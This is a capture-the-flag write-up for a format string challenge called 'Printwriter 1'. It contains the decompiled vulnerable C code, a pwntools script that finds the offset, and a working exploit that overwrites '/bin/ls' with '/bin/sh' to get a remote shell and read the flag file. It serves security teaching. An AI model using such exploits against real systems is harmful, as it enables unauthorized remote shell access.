---
created: 2024-06-06T23:50
updated: 2024-06-10T23:20
---

## Printwriter 1

> My wonderful app works both as an echo server and a file lister!
>
> Bet you can't hack it!`nc 35.240.143.82 4203`

Only the compiled `chal` file was given, after decompiling it with Ghidra, I get

```cpp
undefined8 main(void)
{
    int32_t iVar1;
    char *format;
    
    setup();
    while( true ) {
        fgets(&format, 0x70, _stdin);
        iVar1 = strncmp(&format, "quit", 4);
        if (iVar1 == 0) break;
        printf(&format);
    }
    system("/bin/ls");
    return 0;
}
```

As I can see, and `printf` has been used to print the output directly.

This challenge is in the format string attack category, which I can verify with a simple `%x`

```
$ nc 35.240.143.82 4203
%x
402004
%s
quit
```

### pwntools

I can use pwntools to quickly create our format string payload

#### offset

I first have to find the offset which can be easily done with

```python
from pwn import *

conn = remote("35.240.143.82", 4203)
context.clear(arch='amd64')


def send_payload(p):
    conn.wait(1)
    conn.sendline(p)
    return conn.recv()


print("offset =", FmtStr(execute_fmt=send_payload).offset)
```

```
[x] Opening connection to 35.240.143.82 on port 4203
[x] Opening connection to 35.240.143.82 on port 4203: Trying 35.240.143.82
[+] Opening connection to 35.240.143.82 on port 4203: Done
[*] Found format string offset: 6
offset = 6
[*] Closed connection to 35.240.143.82 port 4203
```

#### what attack to use

In the decompiler, I noticed how `/bin/ls/` is located at `0x00404058`

 ![](https://raw.githubusercontent.com/octo-kumo/images/master/image-20211221173130465.png)

If I edit `/bin/ls/` into `/bin/sh`, as they have same amount of characters, I can gain remote shell access.

Hence I will be using `fmtstr_payload` from pwntools

#### payload

```python
from pwn import *

conn = remote("35.240.143.82", 4203)

context.clear(arch='amd64')
payload = fmtstr_payload(0x6, {0x404058: b'/bin/sh'}, write_size='short')
conn.wait(1)
print("sending" + str(payload))
conn.sendline(payload)
print(conn.recv())
conn.sendline("quit")
conn.interactive()
```

We will be writing the string `/bin/sh` to address `0x404058` with offset `6`.

After sending the payload, `/bin/ls` will be changed to `/bin/sh`. This means that after I exit the loop with `quit`, it should give us shell access.

I will then switch to interactive to more easily take advantage of the shell.

```cpp
system("/bin/sh");
```

Indeed we gain remote shell access.

By running the command `ls`, I find `flag.txt`, and with `cat flag.txt`

```
cat flag.txt
flag{why_would_printf_be_able_to_write_memory????!!}
```

Flag obtained

> If you run the following you can find the message I left
>
> ```
> cd ~
> cd w
> cat README.txt
> Hello, I was here ;) ZY
> ```
